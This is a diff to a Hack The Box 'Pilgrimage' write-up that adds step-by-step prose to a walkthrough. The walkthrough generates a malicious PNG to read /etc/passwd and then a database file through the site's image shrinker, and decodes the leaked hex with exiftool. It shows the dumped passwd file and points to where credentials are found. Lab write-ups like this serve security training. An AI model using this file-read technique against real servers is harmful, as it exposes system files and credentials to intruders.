@@ -74,6 +74,12 @@ Successfully installed pypng-0.20220715.0
    [>] Placing Payload to read /etc/passwd
    [>] PoC PNG generated > exploit1
 ```
+
+After generating our exploit go to the webpage and upload then download the file.
+
+![image](https://github.com/Rogue-1/HTB/assets/105310322/835b5c26-9a4d-4f50-816f-543c4aab208a)
+
+
 ```
 └──╼ [★]$ sudo wget http://pilgrimage.htb/shrunk/64a32325a387c.png
 --2023-07-03 20:36:46--  http://pilgrimage.htb/shrunk/64a32325a387c.png
@@ -87,6 +93,9 @@ Saving to: ‘64a32325a387c.png’
 
 2023-07-03 20:36:46 (195 MB/s) - ‘64a32325a387c.png’ saved [1688/1688]
 ```
+
+now we can use exiftool to get the metadata in hex and then decode to see what we find.
+
 ```
 └──╼ [★]$ exiftool 64a32325a387c.png -b
 Warning: [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers) - 64a32325a387c.png
@@ -135,6 +144,10 @@ Warning: [minor] Text chunk(s) found after PNG IDAT (may be ignored by some read
 3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
 [minor] Text chunk(s) found after PNG IDAT (may be ignored by some readers)2023-07-03T19:36:05+00:002023-07-03T19:36:05+00:002023-07-03T19:36:05+00:00128 1280.016384
 ```
+
+
+The exploit works and we can read /etc/passwd.
+
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -164,6 +177,10 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 _laurel:x:998:998::/var/log/laurel:/bin/false
 ```
+
+By reading the login.php we see a database that contains the info we need to get to the next step.
+
+/var/db/pilgrimage
 ```
 └──╼ [★]$ less login.php
 ```
@@ -193,6 +210,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['passw
    [>] Placing Payload to read /var/db/pilgrimage
    [>] PoC PNG generated > exploit2.png
 ```
+
+
+Follow the same steps to create the new exploit with /var/db/pilgrimage and then decode to find some credentials.
 ```
 └──╼ [★]$ sudo wget http://pilgrimage.htb/shrunk/64a324799638f.png
 --2023-07-03 20:41:58--  http://pilgrimage.htb/shrunk/64a324799638f.png
